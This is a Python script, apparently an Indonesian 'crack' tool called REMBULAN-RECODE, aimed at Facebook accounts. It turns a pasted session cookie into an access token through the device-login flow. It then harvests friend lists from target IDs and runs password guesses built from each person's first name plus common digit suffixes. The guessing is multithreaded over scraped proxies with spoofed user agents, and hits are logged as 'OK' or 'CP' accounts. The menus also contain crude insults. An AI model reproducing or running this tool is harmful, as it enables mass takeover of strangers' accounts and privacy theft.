#ASTAGFIRULLAH JEBOL ðŸ˜‘ðŸ˜‘ðŸ˜‘ðŸ˜‘
import requests,json,os,sys,random,datetime,time,re,platform
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from concurrent.futures import ThreadPoolExecutor as tred
from time import sleep as waktu

###----------[ GLOBAL NAMA ]----------###
id,id2,uid = [],[],[]
tokenefb = []
akunyeh = []
ugen2 = []
ugen = []
loop,baz = 0,[]
ok,cp,oo = 0,0,[]
###----------[ GET PROXY ]----------###
try:
	proxylist= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('socksku.txt','w').write(proxylist)
except Exception as e:
	baz_anim(f'gagal ster :(')
proxsi=open('socksku.txt','r').read().splitlines()

###----------[ USER AGENT ]----------###
for xd in range(10000):
	a=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
	b=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
	c=random.randrange(73,100)
	d=random.randrange(4200,4900)
	e=random.randrange(40,150)
	uaku=f'Mozilla/5.0 (Linux; Android {a}; SAMSUNG SM-A305FN) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	ugen2.append(uaku)

for t in range(10000):
	a=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
	b=random.randrange(111111,210000)
	c=random.randrange(73,100)
	d=random.randrange(4200,4900)
	e=random.randrange(40,150)
	brayen1=f'Mozilla/5.0 (Linux; Android {a}; SM-M317F Build/QP1A.{b}.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	brayen2=f'Mozilla/5.0 (Linux; Android {a}; 2112123AG Build/SKQ1.{b}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	brayen3=f'Mozilla/5.0 (Linux; Android {a}; CPH2527 Build/RKQ1.{b}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	brayen4=f'Mozilla/5.0 (Linux; Android {a}; vivo 1904 Build/RP1A.{b}.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	uaku2 = random.choice([brayen1,brayen2,brayen3,brayen4])
	ugen.append(uaku2)
	
for x in range(10):
	a=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
	b=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
	c=random.randrange(73,100)
	d=random.randrange(4200,4900)
	e=random.randrange(40,150)
	uak=f'Mozilla/5.0 (Linux; Android {a}; Pixel {b}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
mer = '\033[1;31m'
kun = '\033[1;33m'
hijo = '\033[1;32m'
biru = '\033[1;34m'
ung = '\033[1;35m'
puti = '\033[1;37m'
bira = '\033[1;36m'
xxx = '\33[m'

def back():
	login_baz()
###----------[ CONVERT BULAN ]----------###
rb = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
tg = datetime.datetime.now().day
bl = rb[(str(datetime.datetime.now().month))]
th = datetime.datetime.now().year
okh = 'OK-'+str(tg)+'-'+str(bl)+'-'+str(th)+'.txt'
cph = 'CP-'+str(tg)+'-'+str(bl)+'-'+str(th)+'.txt'

###----------[ UNTUK ANIMASI ]----------###
def baz_anim(berjalan):
        for gas in berjalan + "\n":sys.stdout.write(gas);sys.stdout.flush();time.sleep(0.05)
def baz_bann(berjalan):
        for gas in berjalan + "\n":sys.stdout.write(gas);sys.stdout.flush();time.sleep(0.01)
        
###----------[ BANNER MENUH ]----------###
def banner():
	print('''\33[m
REMBULAN-RECODE\x1b[1;91m
____ ____ _  _ ___  _  _ _    ____ _  _    
|__/ |___ |\/| |__] |  | |    |__| |\ |    
\33[m|  \ |___ |  | |__] |__| |___ |  | | \|    ''')

def banlog():
	print('''\x1b[1;92m
         _____   ______ _____ __   _     
 |      |     | |  ____   |   | \  |     
\33[m |_____ |_____| |_____| __|__ |  \_| ''')
###----------[ NGECEK COOKIES ]----------###
def login_baz():
	try:
		token = open('.tokenakun.txt','r').read()
		cok = open('.cookiesakun.txt','r').read()
		tokenefb.append(token)
		try:
			gerap = requests.get('https://graph.facebook.com/me?fields=id&access_token='+tokenefb[0], cookies={'cookie':cok})
			nteng = json.loads(gerap.text)['id']
			menu1()
		except KeyError:
			login_men()
		except requests.exceptions.ConnectionError:
			baz_anim(f'{mer}koneksimu bermasalah ster :(')
			exit()
	except IOError:
		login_men()
		
def result():
	print('â•°â”€ 1. Hasil CP Anda ')
	print('â•°â”€ 2. Hasil OK Anda ')
	print('â•°â”€ 0. Kembali	')
	kz = input('\nâ•°â”€ Chouse : ')
	print('')
	if kz in ['1','01']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print('â•°â”€ File Tidak Di Temukan ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print('â•°â”€ Anda Tidak Memiliki Hasil CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(''+nom+'. '+isi+'\033[31m '+str(len(hem))+' \033[0mcekpoint '+x)
				else:
					lol.update({str(cih):str(isi)})
					print(''+str(cih)+'. '+isi+'\033[31m '+str(len(hem))+' \033[0mcekpoint '+x)
			geeh = input('\nâ•°â”€ Chouse : ')
			print('')
			try:geh = lol[geeh]
			except KeyError:
				print('â•°â”€ Pilih Yang Bener Kontol ')
				exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print('â•°â”€ File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'â•°â”€CP\033[33m {cpkuni[0]}|{cpkuni[1]}\033[0m')
				nocp +=1
			input('\nâ•°â”€ Back Enter ')
			back()
	elif kz in ['2','02']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print('â•°â”€ File Tidak Di Temukan ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print('â•°â”€ Anda Tidak Mempunyai File OK ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(''+nom+'. '+isi+'\033[32m '+str(len(hem))+' \033[0mSucses '+x)
				else:
					lol.update({str(cih):str(isi)})
					print(''+str(cih)+'. '+isi+'\033[32m '+str(len(hem))+' \033[0mSucses '+x)
			geeh = input('\nâ•°â”€ Chouse : ')
			try:geh = lol[geeh]
			except KeyError:
				print('â•°â”€ Pilih Yang Bener Kontol ')
				exit()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print('â•°â”€ File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'\nâ•°â”€OK\033[32m {cpkuni[0]}|{cpkuni[1]}|\033[32m{cpkuni[2]}\033[0m')
				nocp +=1
			input('\nâ•°â”€ Back Enter ')
			back()
	elif kz in ['0','00']:
		back()
	else:
		print('â•°â”€ Pilih Yang Bener Kontol ')
		exit()
###----------[ LOGIN COOKIESNYA ]----------###
def login_men():
    try:
        os.system('clear')
        banlog()
        ses = requests.Session()
        print('')
        your_cookies=input(f'masukan cookie \n[>>] :{xxx}{hijo} ')
        with requests.Session() as r:
                r.headers.update({
                    'content-type': 'application/x-www-form-urlencoded',
                })
                data = {
                    'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038',
                    'scope': ''
                }
                response = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)
                code, user_code = response['code'], response['user_code']
                verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=1348564698517390%7C007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback'.format(code))
                r.headers.pop(
                    'content-type'
                )
                r.headers.update({
                    'sec-fetch-mode': 'navigate',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36',
                    'sec-fetch-site': 'cross-site',
                    'Host': 'm.facebook.com',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'sec-fetch-dest': 'document',
                })
                response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text
                if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
                    print("\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;91m Cookie Invalid...", end='\r');time.sleep(3.5);print("                     ", end='\r')
                else:
                    action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
                    fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
                    jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
                    data = {
                        'fb_dtsg': fb_dtsg,
                        'jazoest': jazoest,
                        'qr': 0,
                        'user_code': user_code,
                    }
                    r.headers.update({
                        'origin': 'https://m.facebook.com',
                        'referer': verification_url,
                        'content-type': 'application/x-www-form-urlencoded',
                        'sec-fetch-site': 'same-origin',
                    })
                    response3 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies})
                    if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
                        r.headers.pop(
                            'content-type'
                        );r.headers.pop(
                            'origin'
                        )
                        response4 = r.post(response3.url, data = data, cookies = {'cookie': your_cookies}).text

                        action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
                        fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
                        jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
                        scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
                        display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
                        user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
                        logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
                        auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
                        encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
                        return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
                        r.headers.update({
                            'origin': 'https://m.facebook.com',
                            'referer': response3.url,
                            'content-type': 'application/x-www-form-urlencoded',
                        })
                        data = {
                            'fb_dtsg': fb_dtsg,
                            'jazoest': jazoest,
                            'scope': scope,
                            'display': display,
                            'user_code': user_code,
                            'logger_id': logger_id,
                            'auth_type': auth_type,
                            'encrypted_post_body': encrypted_post_body,
                            'return_format[]': return_format,
                        }
                        response5 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies}).text
                        windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
                        r.headers.pop(
                            'content-type'
                        );r.headers.pop(
                            'origin'
                        )
                        r.headers.update({
                            'referer': 'https://m.facebook.com/',
                        })
                        response6 = r.get(windows_referer, cookies = {'cookie': your_cookies}).text
                        if 'Sukses!' in str(response6):
                            r.headers.update({
                                'sec-fetch-mode': 'no-cors',
                                'referer': 'https://graph.facebook.com/',
                                'Host': 'graph.facebook.com',
                                'accept': '*/*',
                                'sec-fetch-dest': 'script',
                                'sec-fetch-site': 'cross-site',
                            })
                            response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text
                            access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
                            ken = open(".tokenakun.txt", "w").write(access_token)
                            cok = open(".cookiesakun.txt", "w").write(your_cookies)
                            baz_anim(f'{puti}â””â”€â”€{bira} login berhasil ster jalanin ulang scnya')
                            exit()
                        else:
                            print('\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;91m Gagal...')
    except Exception as e:
        os.system('rm -rf .tokeneakun.txt && rm -rf .cookiesakun.txt')
        baz_anim(f'{puti}â””â”€â”€{kun} login gagal ster coba ganti tumbal')
        exit()

###----------[ BAGIAN MENU ]----------###
def menu1():
	try:
		cok = open('.cookiesakun.txt','r').read()
	except IOError:
		baz_anim(f'{mer}cookies telah kadaluarsa ster')
		waktu(4)
		login_men()
	os.system('clear')
	banner()
	print(f'{xxx}TERIMA KASIH BAGI BANG VINDRA-ID DAN RISKIDEV1')
	os.system("xdg-open https://wa.me/+6281342791377?text=Halo+makasih+bang+sc+nya+moga+ijoðŸ™„")
	print(f'{xxx}1. join grup wa')
	print(f'{xxx}2. ke menu crack')
	helpbas = input(f'{xxx}[>>] : ')
	if helpbas in ['1']:
		os.system("xdg-open https://chat.whatsapp.com/Gt1q2QrXgiBCbNj40KmWMN")
		back()
	elif helpbas in ['2']:
		menu(id)
	else:
		back()
def menu(id):
	try:
		cok = open('.cookiesakun.txt','r').read()
	except IOError:
		baz_anim(f'{mer}cookies telah kadaluarsa ster')
		waktu(4)
		login_men()
	os.system('clear')
	banner()
	print(f'{xxx}')
	print(f'{xxx}1. crack')
	print(f'{xxx}2. crack masal')
	print(f'{xxx}3. cek hasil crack')
	print(f'{xxx}0. hapus cookie')
	helpbas = input(f'{xxx}>> : ')
	if helpbas in ['1']:
		dump()
	elif helpbas in ['3']:
		result()
	elif helpbas in ['2']:
		dump_massal()
	elif helpbas in ['0']:
		os.system('rm -rf .tokenakun.txt')
		os.system('rm -rf .cookiesakun.txt')
		back()
	else:
		back()

###----------[ DUMP ID PUBLIK ]----------###
def dump():
	with requests.Session() as ses:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		a = input('>> masukan id target: ')
		try:
			params = {
			"access_token": token, 
			"fields": "name,friends.fields(id,name,birthday)"
			}
			b = ses.get("https://graph.facebook.com/{}".format(a),params = params,cookies = {'cookie': cok}).json()
			for c in b["friends"]["data"]:
				id.append(c["id"]+"|"+c["name"])
			print('>> Total Idz : {}'.format(len(id)))
		except Exception as e:
			print(e)
			dump()
	atur_dulu()
###----------[ DUMP ID PUBLIK ]----------###
def dump_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		print('') 
		jum = int(input(f'({h}\{x}) Mau berapa ID : '))
	except ValueError:
		print('Masukkan pilihan yang benar')
		exit()
	if jum<1 or jum>100:
		print('Dump erorr')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(f'({h}\{x}) Masukan ID '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
		    headers = ({'user-agent':'Mozilla/5.0 (Linux; Android 8.1.0; V1731CA Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/62.0.3202.84 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US; FBAV/356.0.0.7.89;]'})
		    params = ({'access_token':token,'fields':'friends'})
		    col = ses.get(f'https://graph.facebook.com/{userr}',headers=headers,params=params,cookies = {'cookies':cok}).json()
		    for mi in col['friends']['data']:
		        try:
		           iso = (mi['id']+'|'+mi['name'])
		           if iso in id:pass
		           else:id.append(iso)
		        except:continue
		except (KeyError,IOError):pass
		except requests.exceptions.ConnectionError:
		      print('ConnectionError')
		      exit()
		try:
		   print(f'({h}\{x}) ID terkumpul : {h}'+str(len(id)))
		   atur_dulu()
		except requests.exceptions.ConnectionError:
		      print(f'{x}')
		      print('ConnectionError ')
		      back()
		except (KeyError,IOError):
		        print(f'Pertemanan Tidak Public')
		        time.sleep(3)
		        back()

###----------[  ATUR DULU STER ]----------###
def atur_dulu():
	print(f'{xxx}')
	print(f'[>>] [[{hijo}CRACK DARI ID{xxx}]]')
	print(f'[>>] 1. KONTOL [{h}TUA{x}]')
	print(f'[>>] 2. MEMEK [{h}MUDA{x}]')
	print(f'[>>] 3. BENCONG [{h}ACAK{x}]')
	aturid = input(f'{xxx}[>>] : ')
	if aturid in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)
			
	elif aturid in ['2','02']:
		xbaru=[]
		for baru in sorted(id):
			xbaru.append(baru)
		bkp=len(xbaru)
		bkpp=(bkp-1)
		for miyabi in range(bkp):
			id2.append(xbaru[bkpp])
			bkpp -=1
	elif aturid in ['3','03']:
		for acak in id:
			xnxx = random.randint(0,len(id2))
			id2.insert(xnxx,acak)
	else:
		baz_anim(f'{mer}â””â”€â”€ yang bener lah ster')
		exit()
	print(f'{h}         METODE LOGIN{xxx}')
	print(f'{h}VALIDATE     {u}ASYNC    {b}REGULER\n{h}1 m.fb{x}V1    {u}4 m.fb{x}A1  {b}5 m.fb{x}RE\n{h}2 m.fb{x}V2   \n{h}3 m.fb{x}V3{xxx}')
	metod = input(f'{xxx}[>>] : ')
	if metod in ['1','01']:
		baz.append('free')
	elif metod in ['2','02']:
		baz.append('123')
	elif metod in ['3','03']:
		baz.append('321')
	elif metod in ['5','05']:
		baz.append('mobile')
	elif metod in ['4','04']:
		baz.append('as')
	else:
		baz.append('free')
	su()
def su():
	
	print(f' {h}  PILIH PASSWORD{xxx}')
	print(f' makin lambat lebih baik {xxx}')	
	print(f'>> 1. cepat {xxx}')
	print(f'>> 2. agak lambat{xxx}')
	print(f'>> 3. lambat{xxx}')
	ch = input('>> : ')
	if ch in ['1','01']:
		cu1()
	elif ch in ['2','02']:
		cu2()
	elif ch in ['3','03']:
		cu3()
	else:
		cu2()
def cu3():
	global prog,des
	print(f'{xxx}')
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=30) as gas_krek:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				pwt = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
						pwv.append(frs+'01')
						pwv.append(frs+'02')
						pwv.append(frs+'03')
						pwv.append(frs+'04')
						pwv.append(frs+'05')
						pwv.append(frs+'07')
						pwv.append(frs+'08')
						pwv.append(frs+'09')
						pwv.append(frs+'321')
						pwv.append(frs+'1')
						pwv.append(frs+'12')
						pwv.append(frs+'321')
				if 'ya' in pwt:
					for xpwn in pwn:
						pwv.append(xpwn)
				else:pass
				if 'free' in baz:
					gas_krek.submit(crackfree,idf,pwv)
				elif '123' in baz:
					gas_krek.submit(crackmbasic1,idf,pwv)
				elif '321' in baz:
					gas_krek.submit(crackmbasic,idf,pwv)
				elif 'mobile' in baz:
					gas_krek.submit(crackmobile,idf,pwv)
				elif 'as' in baz:
					gas_krek.submit(crackmobile1,idf,pwv)
				else:
					gas_krek.submit(crackfree,idf,pwv)
		print(f'{xxx}')
		print(f'{hijo}+ {puti}akun ok : {hijo}%s{xxx} '%(ok))
		print(f'{kun}+ {puti}akun cp : {kun}%s{xxx} '%(cp))
		print(f'{xxx}')
		
def cu2():
	global prog,des
	print(f'{xxx}')
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=30) as gas_krek:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				pwt = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
						pwv.append(frs+'01')
						pwv.append(frs+'02')
						pwv.append(frs+'03')
						pwv.append(frs+'05')
						pwv.append(frs+'1')
						pwv.append(frs+'12')
						pwv.append(frs+'321')
				if 'ya' in pwt:
					for xpwn in pwn:
						pwv.append(xpwn)
				else:pass
				if 'free' in baz:
					gas_krek.submit(crackfree,idf,pwv)
				elif '123' in baz:
					gas_krek.submit(crackmbasic1,idf,pwv)
				elif '321' in baz:
					gas_krek.submit(crackmbasic,idf,pwv)
				elif 'mobile' in baz:
					gas_krek.submit(crackmobile,idf,pwv)
				elif 'as' in baz:
					gas_krek.submit(crackmobile1,idf,pwv)
				else:
					gas_krek.submit(crackfree,idf,pwv)
		print(f'{xxx}')
		print(f'{hijo}+ {puti}akun ok : {hijo}%s{xxx} '%(ok))
		print(f'{kun}+ {puti}akun cp : {kun}%s{xxx} '%(cp))
		print(f'{xxx}')
				
def cu1():
	global prog,des
	print(f'{xxx}')
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=30) as gas_krek:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = ['kamu','kamu nanya']
				pwt = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
				if 'ya' in pwt:
					for xpwn in pwn:
						pwv.append(xpwn)
				else:pass
				if 'free' in baz:
					gas_krek.submit(crackfree,idf,pwv)
				elif '123' in baz:
					gas_krek.submit(crackmbasic1,idf,pwv)
				elif '321' in baz:
					gas_krek.submit(crackmbasic,idf,pwv)
				elif 'mobile' in baz:
					gas_krek.submit(crackmobile,idf,pwv)
				elif 'as' in baz:
					gas_krek.submit(crackmobile1,idf,pwv)
				else:
					gas_krek.submit(crackfree,idf,pwv)
		print(f'{xxx}')
		print(f'{hijo}+ {puti}akun ok : {hijo}%s{xxx} '%(ok))
		print(f'{kun}+ {puti}akun cp : {kun}%s{xxx} '%(cp))
		print(f'{xxx}')
		
def cektahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011'
		elif fx[:6] in ['100004']          :tahunz = '2012'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2016'
		elif fx[:5] in ['10002']           :tahunz = '2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006']           :tahunz = '2021'
		elif fx[:5] in ['10009']           :tahunz = '2023'
		elif fx[:5] in ['10007','10008']:tahunz = '2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008'
	elif len(fx)==8:
		tahunz = '2007'
	elif len(fx)==7:
		tahunz = '2006'
	else:tahunz=''
	return tahunz

def crackfree(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f'\r{h}V1 {idf}{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]')
	prog.advance(des)
	ua = random.choice(['Mozilla/5.0 (Windows NT 3; WOW64 Build/PKQ1.135372.015; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.4349.120 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 1; WOW64 Build/QP1A.197955.018; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4313.95 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 3; CPH1861 Build/PKQ1.188037.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4774.131 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 2; oppo6779 Build/PKQ1.195278.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.4754.41 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10.5; Nokia 1 Build/OPM1.125837.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.4589.95 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 3; WOW64 Build/PPR1.178865.013; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4694.84 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5; vivo 1914 Build/OPM1.131962.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4702.75 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 12; M2012K11AG Build/RKQ1.150097.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4882.113 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0; Nokia C20 Plus Build/PPR1.176922.018; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4504.59 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4.5; SM-G900P Build/QP1A.193092.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4504.62 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 2.5; RMX3063 Build/RKQ1.199699.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/84.0.4319.116 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 2.0; 2201123G Build/QP1A.119796.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4596.86 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 12.5; Nokia C1 2nd Edition Build/PPR1.129833.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4817.42 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.5; 21121210G Build/RKQ1.114792.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4272.71 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 1.5; 2203129G Build/PPR1.180139.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4769.103 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0; 2211133C Build/TP1A.169032.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.4375.64 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; CPH2071 Build/SP1A.188536.018; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4846.51 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 3.5; WOW64 Build/PKQ1.161506.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4224.139 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 9; WOW64 Build/RKQ1.144629.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4508.66 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11.5; RMX1811 Build/QP1A.130029.013; wv) AppleWebKit/537.36 (KHTML, like Gecko) 